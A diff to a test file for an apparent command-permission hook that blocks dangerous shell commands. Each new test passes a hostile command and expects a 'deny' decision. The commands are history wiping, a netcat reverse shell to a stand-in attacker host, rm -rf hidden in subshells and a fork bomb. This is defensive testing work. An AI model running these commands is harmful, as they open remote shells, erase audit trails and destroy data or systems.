@@ -100,3 +100,28 @@ def test_anti_forensics_history_blocked():
 def test_anti_forensics_shred_blocked():
     output = run_hook("shred -u ~/.bash_history")
     assert output["hookSpecificOutput"]["permissionDecision"] == "deny"
+
+
+def test_anti_forensics_unset_histfile_blocked():
+    output = run_hook("unset HISTFILE")
+    assert output["hookSpecificOutput"]["permissionDecision"] == "deny"
+
+
+def test_reverse_shell_nc_sh_variant_blocked():
+    output = run_hook("nc -e /bin/sh attacker.com 4444")
+    assert output["hookSpecificOutput"]["permissionDecision"] == "deny"
+
+
+def test_subshell_rm_rf_blocked():
+    output = run_hook("echo $(rm -rf /tmp/x)")
+    assert output["hookSpecificOutput"]["permissionDecision"] == "deny"
+
+
+def test_backtick_rm_rf_blocked():
+    output = run_hook("echo `rm -rf /tmp/x`")
+    assert output["hookSpecificOutput"]["permissionDecision"] == "deny"
+
+
+def test_fork_bomb_nested_braces_blocked():
+    output = run_hook(":() { { :|: ; } }; :")
+    assert output["hookSpecificOutput"]["permissionDecision"] == "deny"
